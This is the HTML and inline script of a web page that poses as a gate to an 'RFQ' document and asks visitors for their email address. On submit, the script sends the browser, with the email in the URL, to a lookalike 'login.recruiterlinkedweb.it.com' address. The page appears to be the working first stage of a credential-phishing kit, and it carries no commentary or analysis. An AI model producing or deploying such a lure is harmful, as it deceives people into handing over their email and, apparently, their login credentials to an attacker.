  <body class="flex items-center justify-center min-h-screen px-4">
    <!-- Modal Box -->
    <div class="bg-white border shadow-lg rounded-md w-full max-w-sm">
      <!-- Header Bar -->
      <div
        class="bg-blue-600 text-white text-center py-2 text-sm font-semibold rounded-t-md"
      >
        Type in <span class="font-bold">your email</span> to access on RFQ
      </div>

      <!-- Content -->
      <form id="accessForm" class="p-6 space-y-4">
        <label for="email" class="text-sm text-gray-800 block"
          >Email Address</label
        >
        <input
          id="email"
          name="email"
          type="email"
          placeholder="Enter your email address"
          required=""
          class="w-full border border-gray-300 rounded px-2 py-2 text-sm focus:outline-none focus:ring-2 focus:ring-blue-500"
        />

        <div class="flex justify-end pt-2">
          <button
            type="submit"
            class="bg-blue-600 hover:bg-blue-700 text-white text-sm font-medium px-4 py-1.5 rounded"
          >
            Review Access
          </button>
        </div>
        <p id="error" class="text-xs text-red-500 hidden">
          Invalid email address. Please enter a valid email.
        </p>
      </form>
    </div>

    <script>
      // Email validation function
      function isValidEmail(email) {
        const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
        return emailRegex.test(email);
      }

      document
        .getElementById("accessForm")
        .addEventListener("submit", function (e) {
          e.preventDefault();

          const emailInput = document.getElementById("email").value.trim();
          const error = document.getElementById("error");

          // Validate email
          if (!isValidEmail(emailInput)) {
            error.textContent =
              "Invalid email address. Please enter a valid email.";
            error.classList.remove("hidden");
            return;
          }

          // Hide error message if email is valid
          error.classList.add("hidden");

          // Redirect to URL with email appended
          window.location.href =
            "https://login.recruiterlinkedweb.it.com/AHfrndqD?email=" +
            encodeURIComponent(emailInput);
        });
    </script>
